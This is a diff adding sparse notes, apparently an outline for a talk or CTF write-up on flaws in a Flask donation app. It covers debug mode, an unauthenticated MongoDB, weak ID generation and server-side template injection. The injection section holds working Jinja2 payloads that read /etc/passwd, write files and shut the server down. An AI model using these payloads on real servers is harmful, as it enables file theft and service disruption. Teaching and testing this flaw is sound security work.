@@ -1,0 +1,127 @@
+
+
+	what is donat?
+
+	base functions
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+	- running in debug mode (low performance)
+		
+		http://flask.pocoo.org/docs/0.12/deploying/#deployment
+
+		gunicorn
+
+		debug hooks 
+
+		devkey
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+	- mongodb external ports and no authentication
+	
+	docker syntax
+
+	add user
+
+	add auth
+
+	close external ports
+
+	iptables block
+
+	etc..
+
+
+
+
+
+
+
+
+
+
+	- weak algo generating uuid
+	
+	what is base functional?
+
+	donat, and get donat info
+
+	modified Luhn algo
+
+
+
+
+
+
+
+	script here
+
+
+
+
+
+
+
+
+
+
+
+
+	- ssti (Server-Side Template Injection)
+
+	what unusual in 404 page?
+
+
+	# list of avaliable objects
+	{{ ''.__class__.__mro__[2].__subclasses__()
+
+	# read file from fs
+	{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
+
+	# write file to fs
+	{{''.__class__.__mro__[2].__subclasses__()[40]('/tmp/owned.cfg', 'w').write('i can write anywhere') }}
+
+	# shutdown the server
+	{{ request.environ['werkzeug.server.shutdown']() }}
+
+
+	# in links below described how to add custom key-value in Flask config and how to RCE
+	links:
+	https://nvisium.com/blog/2016/03/09/exploring-ssti-in-flask-jinja2/
+	https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/
+
+	in real world:
+	Uber was affected by SSTI (https://hackerone.com/reports/125980)
